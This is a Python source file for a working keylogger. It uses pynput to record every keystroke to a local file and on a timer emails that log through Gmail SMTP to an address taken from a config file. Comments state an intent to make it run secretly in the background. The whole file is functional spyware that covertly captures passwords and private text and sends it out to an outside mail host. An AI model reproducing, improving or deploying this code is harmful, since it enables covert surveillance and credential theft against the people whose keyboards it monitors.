from pynput import keyboard
import time
from multiprocessing import Process, freeze_support
import smtplib
from email.message import EmailMessage
import pytz
from datetime import datetime
import configparser
import os
import sys


COMBINATION = [{keyboard.Key.shift_l, keyboard.Key.ctrl_l}, {keyboard.Key.shift_l, keyboard.KeyCode.from_char('A')},]
current = set()

c_parser = configparser.ConfigParser()  #configparser object
c_parser.read(os.path.dirname(os.path.realpath(__file__))+"/data/config.ini") #Lesen der ini-Datei mit Token

def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)

class Logging:
    def __init__(self):
        self.file_path = resource_path('data\\logging_values.txt')
        self.cooldown = c_parser.get('Time' ,'cooldown')

    def on_press(self, key):
        with open(self.file_path, 'a') as f:
            if key == keyboard.Key.esc:
                #Stop listener
                return False
            try:
                f.write(str(key.char))

            except AttributeError:
                if key == keyboard.Key.caps_lock:
                    pass

                elif key == keyboard.Key.space:
                    f.write(' ')
                
                else:
                    f.write(f" [{str(key)}] ")
        
            for combs in COMBINATION:
                if key in combs:
                    current.add(key)
                    if all(k in current for k in combs):
                        print("received!")
                        f.write(f" [{current} ] ") #Write in txt file the right combination and check for other combinations
        f.close()

    def on_release(self, key):
        try:
            current.clear()

        except KeyError:
            pass

        if key == keyboard.Key.esc:
            # Stop listener
            return False


    def logging(self):
        with keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release) as listener:
            listener.join()
        return listener
        
    def delay(self):
        time_wanted = time.time() + int(self.cooldown)
        while time.time() <= time_wanted:
            time_now = time.time()
            if time_now + 1 >= time_wanted:
                time_wanted += int(self.cooldown)
                m.mail()
                print("Mail send!")
                with open(self.file_path, "w") as t:          #Clear .txt file after every mail send for better readability
                    pass


class Email:
    def __init__(self):
        self.mail_to = c_parser.get('Mail', 'mail_entry')
        self.mail_from = c_parser.get('Mail', 'mail_exit')
        self.mail_pw = c_parser.get('PW', 'pw')


    def mail(self):
        msg = EmailMessage()
        msg['Subject'] = f"Keylogger - Protocol from {m.current_time()}"
        msg['From'] = self.mail_from
        msg['To'] = self.mail_to
        msg.set_content("A TXT file with all detected keystrokes was attached to this email. Please DO NOT reply to this email, it was automatically generated.")

        with open(t.file_path, "rb") as f:
            msg.add_attachment(f.read(), maintype='text', subtype='plain', filename="logging_values.txt")

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(self.mail_from, self.mail_pw)
            smtp.send_message(msg)
        
    
    def current_time(self):
        tz = pytz.timezone('Europe/Berlin')
        berlin_now = datetime.now(tz)
        conv_val = berlin_now.strftime('%Y-%m-%d %H:%M:%S')
        return conv_val
    
#Add that the file runs secretly in the background
#Add better vision for keystrokes like Key.ctrl
#Problem war: Es haben sich im TM immer weitere Instanzen geöffnet. Problem wurde behoben, es sind "nur noch" 4 Instanzen die sich nicht vermehren(Durch frezze und eigenen Prozess)

t = Logging()
m = Email()

if __name__ == '__main__':
    freeze_support()
    Process(target=t.delay).start()
    Process(target=t.logging).start()